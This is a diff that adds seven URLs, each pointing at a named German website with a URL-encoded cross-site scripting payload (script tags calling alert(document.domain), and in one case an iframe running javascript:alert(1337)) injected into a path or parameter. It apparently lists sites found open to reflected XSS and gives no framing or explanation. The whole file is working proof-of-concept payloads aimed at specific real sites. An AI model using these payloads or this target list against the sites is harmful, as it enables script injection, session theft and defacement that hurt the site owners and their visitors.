@@ -1,0 +1,7 @@
+http://damen-kleve.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://dammann-sylt.de/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://dasliegedreirad.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://datennetzkomponenten.de/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm
+http://davyblanc.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://da-wirtschaftstag.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://dcdiabolo.de/?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
